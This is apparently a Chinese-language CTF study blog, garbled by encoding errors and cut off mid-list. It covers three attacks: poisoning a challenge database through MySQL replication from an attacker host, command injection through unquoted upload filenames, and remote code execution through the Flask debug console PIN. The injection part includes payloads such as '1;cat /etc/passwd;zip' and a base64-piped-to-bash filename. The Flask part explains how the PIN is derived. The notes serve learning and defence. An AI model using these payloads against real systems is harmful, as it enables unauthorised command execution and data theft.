<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">## åŒä¸€å±€åŸŸç½‘å†…æ³¨æ„è¦å”¯ä¸€</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">100</span>  </span><br><span class="line"><span class="comment">## å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥éšä¾¿å–ï¼ˆå…³é”®ï¼‰</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹é…ç½®åéœ€è¦é‡å¯æ‰èƒ½ç”Ÿæ•ˆï¼š</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service mysql restart</span></span><br></pre></td></tr></table></figure>

<p>é‡å¯ä¹‹åè¿›å…¥mysqlï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mysql -uroot -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>åœ¨<code>master</code>æ•°æ®åº“åˆ›å»ºæ•°æ®åŒæ­¥ç”¨æˆ·ï¼Œæˆäºˆç”¨æˆ· slave REPLICATION SLAVEæƒé™å’ŒREPLICATION CLIENTæƒé™ï¼Œç”¨äºåœ¨ä¸»ä»åº“ä¹‹é—´åŒæ­¥æ•°æ®ã€‚</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> SLAVE, <span class="keyword">REPLICATION</span> CLIENT <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¯­å¥ä¸­çš„<code>%</code>ä»£è¡¨æ‰€æœ‰æœåŠ¡å™¨éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªç”¨æˆ·ï¼Œå¦‚æœæƒ³æŒ‡å®šç‰¹å®šçš„ipï¼Œå°†<code>%</code>æ”¹æˆipå³å¯ã€‚</p>
<p>æŸ¥çœ‹ä¸»mysqlçš„çŠ¶æ€ï¼š</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">show <span class="keyword">master</span> <span class="title">status</span>;</span><br></pre></td></tr></table></figure>

<p>è®°å½•ä¸‹<code>File</code>å’Œ<code>Position</code>çš„å€¼ï¼Œå¹¶ä¸”ä¸è¿›è¡Œå…¶ä»–æ“ä½œä»¥å…å¼•èµ·<code>Position</code>çš„å˜åŒ–ã€‚</p>
<p><img src="/post/Notes/image-20230330224610135.png" alt="image-20230330224610135"></p>
<blockquote>
<p><code>File</code>ï¼šè¿™æ˜¯ MySQL æœåŠ¡å™¨æ­£åœ¨å†™å…¥çš„å½“å‰äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶çš„åç§°ã€‚</p>
<p><code>Position</code>ï¼šè¿™æ˜¯ä¸‹ä¸€ä¸ªäº‹ä»¶å°†è¢«å†™å…¥çš„äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ä¸­çš„ä½ç½®ã€‚</p>
</blockquote>
<h3 id="ç¯å¢ƒæ‰§è¡Œã€ä»ã€‘"><a href="#ç¯å¢ƒæ‰§è¡Œã€ä»ã€‘" class="headerlink" title="ç¯å¢ƒæ‰§è¡Œã€ä»ã€‘"></a>ç¯å¢ƒæ‰§è¡Œã€ä»ã€‘</h3><p>é…ç½®ç¯å¢ƒå·²ç»æœ‰äº†ï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘å¦‚ä½•ä¿®æ”¹</p>
<blockquote>
<p>åœ¨ä»<code>my.cnf</code>é…ç½®ä¸­æ–°å¢ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">mysqld]</span><br><span class="line"><span class="comment">## è®¾ç½®server_id,æ³¨æ„è¦å”¯ä¸€</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">101</span>  </span><br><span class="line"><span class="comment">## å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œä»¥å¤‡Slaveä½œä¸ºå…¶å®ƒSlaveçš„Masteræ—¶ä½¿ç”¨</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave-bin   </span><br><span class="line"><span class="comment">## relay_logé…ç½®ä¸­ç»§æ—¥å¿—</span></span><br><span class="line"><span class="attr">relay_log</span>=edu-mysql-relay-bin  </span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹é…ç½®åéœ€è¦é‡å¯æ‰èƒ½ç”Ÿæ•ˆï¼š</p>
</blockquote>
<p>ä¿®æ”¹ä¸»åº“ä¿¡æ¯ï¼Œå°†ä¸»åº“ä¿¡æ¯æ”¹æˆæ”»å‡»æœºï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯ä¸»æœºä¹‹å‰å»ºç«‹çš„</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">change master <span class="keyword">to</span> <span class="attribute">master_host</span>=<span class="string">&#x27;æ”»å‡»æœºip&#x27;</span>, <span class="attribute">master_user</span>=<span class="string">&#x27;slave&#x27;</span>, <span class="attribute">master_password</span>=<span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>, <span class="attribute">master_port</span>=3306, <span class="attribute">master_log_file</span>=<span class="string">&#x27;mysql-bin.000064&#x27;</span>, master_log_pos= 12, <span class="attribute">master_connect_retry</span>=30;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*æ³¨ï¼šæ—¥å¿—çš„postionå’Œfileè¦ä¿®æ”¹æˆè‡ªå·±çš„æ”»å‡»æœºå¯¹åº”çš„ï¼ŒæŒ‡å®šä»åº“ä»å“ªä¸ªæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œä»å“ªä¸ªä½ç½®è¿›è¡Œè¯»å–</p>
</blockquote>
<p>ä¿®æ”¹åï¼Œæ‰§è¡Œ</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="literal">start</span> <span class="literal">slave</span>;</span><br><span class="line"><span class="comment">#å¼€å¯ä¸»ä»å¤åˆ¶</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œ</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">show <span class="literal">slave</span> status;</span><br><span class="line"><span class="comment">#æŸ¥çœ‹åŒæ­¥çŠ¶æ€</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>SlaveIORunning</code> å’Œ <code>SlaveSQLRunning</code> éƒ½æ˜¯Yesè¯´æ˜ä¸»ä»å¤åˆ¶å·²ç»å¼€å¯</p>
<p>ç„¶åå°±æŒ‰ä¹‹å‰å¾—åˆ°ä¿¡æ¯ï¼Œåœ¨ä¸»åº“å»ºç«‹ctfåº“ï¼Œç„¶åå»ºç«‹adminè¡¨ï¼Œåœ¨é‡Œé¢æ·»åŠ userå’Œpasswordçš„æ•°æ®ã€</p>
<p>æœ€åç­‰ç¯å¢ƒæ•°æ®åº“ã€ä»åº“ã€‘ä¸æ”»å‡»æœºæ•°æ®åº“åŒæ­¥åï¼Œå³å¯è¿›è¡ŒæˆåŠŸç™»å½•æ‹¿åˆ°flag</p>
<blockquote>
<p>P.S</p>
<p>ç”±äºmysql8æ–°å¢å¯†ç è§„åˆ™<code>caching_sha2_password</code>ï¼Œè¦æ±‚å¯†ç å¿…é¡»æœ‰ä¸€å®šå¤æ‚åº¦ï¼Œå¿…é¡»æœ‰å­—æ¯å¤§å°å†™ã€æ•°å­—å’Œç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æ—¶å¯†ç é€šä¸è¿‡ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹å¯†ç è§„åˆ™ä¸º<code>mysql_native_password</code>ä»¥å®ç°å¯ä»¥ç”¨ç®€æ˜“å¯†ç </p>
</blockquote>
<h1 id="windowsä¸linuxå¯¹-çš„ä¸åŒè§£æä¸é™åˆ¶"><a href="#windowsä¸linuxå¯¹-çš„ä¸åŒè§£æä¸é™åˆ¶" class="headerlink" title="windowsä¸linuxå¯¹;çš„ä¸åŒè§£æä¸é™åˆ¶"></a>windowsä¸linuxå¯¹;çš„ä¸åŒè§£æä¸é™åˆ¶</h1><p>åœ¨windowsä¸­ï¼Œä½ å¯ä»¥å°†æ–‡ä»¶ååä¸ºç±»ä¼¼</p>
<blockquote>
<p>1;hahahaha;.txt</p>
</blockquote>
<p><img src="/post/Notes/image-20230501222412594.png" alt="image-20230501222412594"></p>
<p>è€Œåœ¨linuxä¸­åˆ™ä¸è¡Œï¼Œå› ä¸ºå®ƒä¼šå°†å…¶è§£ææˆä¸‰æ®µå‘½ä»¤</p>
<blockquote>
<p>1 hahahaha .txt</p>
</blockquote>
<p>å¦‚æœæƒ³è¦å‘½åï¼Œåˆ™éœ€è¦å•å¼•å·åŒ…è£¹</p>
<p><img src="/post/Notes/image-20230501222722767.png" alt="image-20230501222722767"></p>
<blockquote>
<p>&#x3D;&#x3D;&gt;æ‰€ä»¥å¦‚æœå­˜åœ¨ä¸€ä¸ªç¯å¢ƒï¼Œä¼šå°†ä¸Šä¼ çš„zipæ–‡ä»¶è‡ªåŠ¨è§£å‹ï¼Œæˆ–è€…ä¼šå°†ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ£€æµ‹å¹¶æŠŠä¸Šä¼ æ–‡ä»¶æ–‡ä»¶ååŒ…å«åœ¨å‘½ä»¤ä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰åŠ ä¸Šå¼•å·é™åˆ¶å­—ç¬¦ç±»å‹</p>
</blockquote>
<p>æ¯”å¦‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -oq /tmp/xx -d /home/</span><br><span class="line">or</span><br><span class="line"><span class="built_in">cat</span> /tmp/xx </span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆçŒœæµ‹å¦‚æœæ–‡ä»¶åä¸º</p>
<blockquote>
<p>1;cat &#x2F;etc&#x2F;passwd;zip</p>
</blockquote>
<p>é‚£ä¹ˆæ‰§è¡Œæ—¶ï¼Œå°±ä¼šå¯¼è‡´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -oq /tmp/1;</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd;</span><br><span class="line">.zip -d /home/</span><br></pre></td></tr></table></figure>

<p>å°±å®ç°äº†ä¸Šä¼ æ–‡ä»¶è¾¾åˆ°RCEçš„ç›®çš„ï¼Œå¹¶ä¸”è¿™äº›å‘½ä»¤å¤§éƒ½æ˜¯ä»¥rootæƒé™æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ‰€ä»¥æ“ä½œæ€§æå¤§ï¼Œå±å®³æå¤§ï¼Œå®é™…ç¯å¢ƒåº”æ³¨æ„è¿™äº›ç”¨æˆ·å¯æ§çš„æ•°æ®æ•°æ®ä¸èƒ½ä¸ç»è¿‡å¤„ç†å¹¶å…¥ä»»ä½•å‘½ä»¤ä¸­å»</p>
<hr>
<p>å½“ç„¶å®é™…ç¯å¢ƒä¸‹å‘½ä»¤å¤§éƒ½å¯èƒ½ä¼šå› ä¸ºä¸€äº›åŸå› è¢«è¿‡æ»¤æˆ–è€…æ— æ³•æ‰§è¡Œï¼Œäº¦æˆ–è€…æ˜¯å†…å®¹æ— æ³•å›æ˜¾ï¼Œå¯ä»¥è€ƒè™‘å°†å…¶è½¬æ¢ä¸ºå…¶ä»–ç¼–ç ç±»å‹ï¼Œå¹¶å°†å›æ˜¾å†…å®¹å¯¼å…¥åˆ°å…¶ä»–æ–‡ä»¶ä¸­å»ï¼Œå†æ¥æ‰§è¡Œ</p>
<blockquote>
<p>1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip</p>
<p>#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt</p>
</blockquote>
<h1 id="Flaskçš„Debugæ¨¡å¼"><a href="#Flaskçš„Debugæ¨¡å¼" class="headerlink" title="Flaskçš„Debugæ¨¡å¼"></a>Flaskçš„Debugæ¨¡å¼</h1><p>åœ¨æ¯”èµ›æ—¶ï¼Œçœ‹åˆ°æœ‰é“é¢˜å¤§ä½¬ä¸€ç›´åœ¨è¯´çœ‹çœ‹<code>flask</code>çš„<code>debug</code>å¼€å¯æ²¡ï¼Œè®°å½•å­¦ä¹ ä¸€ä¸‹</p>
<p>ä½¿ç”¨ Flask å¼€å‘è¿‡ç¨‹ä¸­å­˜åœ¨ä¸¤ä¸ªå¸¸è§çš„é—®é¢˜ï¼š</p>
<blockquote>
<ol>
<li>å½“ Flask ç¨‹åºå‡ºé”™æ—¶ï¼Œæ²¡æœ‰æç¤ºé”™è¯¯çš„è¯¦ç»†ä¿¡æ¯ï¼›</li>
<li>ä¿®æ”¹ Flask æºä»£ç åéœ€è¦é‡å¯ Flask ç¨‹åºã€‚</li>
</ol>
</blockquote>
<p>debugæ¨¡å¼å¼€å¯çš„ä»£ç å°±æ˜¯</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>) <span class="comment">#è¿™é‡Œå°±æ˜¯å¼€å¯debugæ¨¡å¼</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œæ—¶ï¼Œæ˜¾ç¤ºè¾“å‡ºä¹Ÿä¼šæ˜¾ç¤ºdebugæ¨¡å¼å¼€å¯</p>
<blockquote>
<p>$ python3 debug.py</p>
<ul>
<li>Serving Flask app â€œdebugâ€ (lazy loading)</li>
<li>Environment: production</li>
<li><code>Debug mode: on</code></li>
<li>Restarting with stat</li>
<li>Debugger is active!</li>
<li>Debugger PIN: 316-471-540</li>
<li>Running on <a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> (Press CTRL+C to quit)</li>
</ul>
</blockquote>
<p>å¼€å¯åï¼Œå½“ç¨‹åºè¿è¡Œé”™è¯¯æ—¶ï¼Œç½‘ç«™é¡µé¢å°±ä¼šå°†é”™è¯¯ç‚¹æ‰€åœ¨ä»£ç æ˜¾ç¤ºï¼Œå¹¶ä¸”ç»™å‡ºé”™è¯¯åŸå› ä»¥åŠä¿®æ­£æ–¹æ¡ˆ</p>
<p>è€Œå¦‚æœä¸å¼€å¯debugæ¨¡å¼ï¼Œæ˜¾ç¤ºçš„ç»“æœå°±ä¸ä¼šæ˜¾ç¤ºé”™è¯¯åŸå› </p>
<p><img src="/post/Notes/image-20230615002937536.png" alt="image-20230615002937536"></p>
<p>è€Œå¼€å¯åå°±æ˜¯</p>
<p><img src="/post/Notes/image-20230615002956862.png" alt="image-20230615002956862"></p>
<p>è€Œä¿®æ”¹çš„è¯ï¼Œä¹Ÿä¸ç”¨é€€å‡ºç¨‹åºï¼Œé‡æ–°åŠ è½½</p>
<p>ç›´æ¥ä¿®æ”¹ä»£ç ï¼Œç„¶åä¿å­˜ï¼Œå°±ä¼šæˆåŠŸä¿®æ”¹å¹¶ä¸”è‡ªè¡Œé‡å¯ï¼Œå¹¶ä¸”ä¸ä¼šå½±å“ç¨‹åºçš„æ­£å¸¸è¿è¡Œï¼Œç¨‹åºè¾“å‡ºä¹Ÿä¼šæ˜¾ç¤ºç¨‹åºå·²ä¿®æ”¹</p>
<p><img src="/post/Notes/image-20230615003317118.png" alt="image-20230615003317118"></p>
<h2 id="åˆ©ç”¨debugåŠŸèƒ½èƒ½å¹²å•¥"><a href="#åˆ©ç”¨debugåŠŸèƒ½èƒ½å¹²å•¥" class="headerlink" title="åˆ©ç”¨debugåŠŸèƒ½èƒ½å¹²å•¥"></a>åˆ©ç”¨debugåŠŸèƒ½èƒ½å¹²å•¥</h2><p>flaskåœ¨debugæ¨¡å¼ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªdebugger pinï¼Œå¹¶ä¸”å¤šæ¬¡é‡å¯flaskæœåŠ¡ï¼ŒPINç ä¸ä¼šæ”¹å˜</p>
<p><img src="/post/Notes/image-20230615134425055.png" alt="image-20230615134425055"></p>
<p>é€šè¿‡PINç å¯ä»¥è¿›å…¥pythonçš„äº¤äº’å¼shell</p>
<p>å¦‚</p>
<p><img src="/post/Notes/image-20230615134634288.png" alt="image-20230615134634288"></p>
<p>è¿™é‡Œ<code>1/0</code>æŠ¥é”™</p>
<p>ç‚¹å‡»åï¼Œå³è¾¹å°±ä¼šæ˜¾ç¤ºä¸€ä¸ªç»ˆç«¯çš„å›¾æ ‡ï¼Œç‚¹å‡»åï¼Œéœ€è¦æä¾›PINç ï¼Œç„¶åä¾¿å¯ä»¥è¿›å…¥äº¤äº’å¼shell</p>
<p><img src="/post/Notes/image-20230615134831790.png" alt="image-20230615134831790"></p>
<p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">result = subprocess.run(<span class="string">&#x27;dir&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p><img src="/post/Notes/image-20230615135711738.png" alt="image-20230615135711738"></p>
<p>è€ŒæœåŠ¡å™¨ç«¯çš„è¯·æ±‚å¤´</p>
<blockquote>
<p>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] â€œGET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1â€ 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] â€œGET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(â€˜dirâ€™,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1â€ 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] â€œGET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(â€˜gbkâ€™)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1â€ 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] â€œGET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1â€ 200 -</p>
</blockquote>
<p>æ‰€ä»¥å¯ä»¥çœ‹åˆ°ï¼Œå¯åŠ¨debugåœ¨å…¬å¼€ç¯å¢ƒä¸‹ï¼Œæ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œä¸ä»…ç”¨æˆ·å¯ä»¥çœ‹åˆ°ä½ çš„ä»£ç å†…å®¹ï¼Œè€Œä¸”å¦‚æœå½“å‰flaskæœåŠ¡çš„PINç æ³„éœ²ï¼Œè¿˜ä¼šé€ æˆè¢«æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œå‘½ä»¤ç­‰ä¸€ç³»åˆ—æ¶æ„æ“ä½œ</p>
<p>ä½†æ˜¯ä¹Ÿä¸å®¹æ˜“å®ç°è¿™ä¸ªæ¡ä»¶</p>
<p><img src="/post/Notes/image-20230617144803167.png" alt="image-20230617144803167"></p>
<p>å› ä¸ºPIN rceå®ç°æ˜¯éœ€è¦è®¾ç½®cookieå¤´çš„ï¼Œè€Œä¸”å®é™…è¿›è¡Œæ—¶ä¼šå‘ç° PIN RCE æ— æ³•è¿›è¡Œ<code>CRLF</code>æ‹†åˆ†æ³¨å…¥ï¼Œå› ä¸ºå®ƒæ ¹æœ¬ä¸è§£æå›è½¦æ¢è¡Œï¼Œåªèƒ½ä¸€è¡Œè¡Œè¿›è¡Œè¾“å…¥ï¼Œæ‰€ä»¥å¾ˆéš¾å®ç°</p>
<h2 id="PIN-ç å¦‚ä½•ç”Ÿæˆ"><a href="#PIN-ç å¦‚ä½•ç”Ÿæˆ" class="headerlink" title="PIN ç å¦‚ä½•ç”Ÿæˆ"></a>PIN ç å¦‚ä½•ç”Ÿæˆ</h2><p>ä½†æ˜¯PINç å¹¶ä¸æ˜¯éšæœºç”Ÿæˆï¼Œå½“æˆ‘ä»¬é‡å¤è¿è¡ŒåŒä¸€ç¨‹åºæ—¶ï¼Œç”Ÿæˆçš„PINä¸€æ ·ï¼ŒPINç ç”Ÿæˆæ»¡è¶³ä¸€å®šçš„ç”Ÿæˆç®—æ³•</p>
<p>åœ¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.run(debug = <span class="literal">True</span>)app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç æ•²æ–­ç‚¹ï¼Œå‘ç°äº†<code>get_pin_and_cookie_name</code>å‡½æ•°</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string">â€‹</span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">â€‹</span><br><span class="line">    Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">â€‹</span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line">â€‹</span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line">â€‹</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line">â€‹</span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line">â€‹</span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">â€‹</span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line">â€‹</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">â€‹</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">â€‹</span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">â€‹</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">â€‹</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>

<p><strong>ç”Ÿæˆè¦ç´ ï¼š</strong></p>
<blockquote>
<p>username<br>é€šè¿‡getpass.getuser()è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶è¯»å–&#x2F;etc&#x2F;passwd<br>å¼•ç”¨<br>modname<br>é€šè¿‡getattr(mod,â€œfileâ€,None)è¯»å–ï¼Œé»˜è®¤å€¼ä¸ºflask.app<br>å¼•ç”¨<br>appname<br>é€šè¿‡getattr(app,â€œnameâ€,type(app).name)è¯»å–ï¼Œé»˜è®¤å€¼ä¸ºFlask<br>å¼•ç”¨<br>moddir<br>å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ï¼Œé€šè¿‡getattr(mod,â€œfileâ€,None)è¯»å–å®é™…åº”ç”¨ä¸­é€šè¿‡æŠ¥é”™è¯»å–<br>å¼•ç”¨<br>uuidnode<br>é€šè¿‡uuid.getnode()è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addresså¾—åˆ°16è¿›åˆ¶ç»“æœï¼Œè½¬åŒ–ä¸º10è¿›åˆ¶è¿›è¡Œè®¡ç®—<br>å¼•ç”¨<br>machine_id<br>æ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œmachine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š</p>
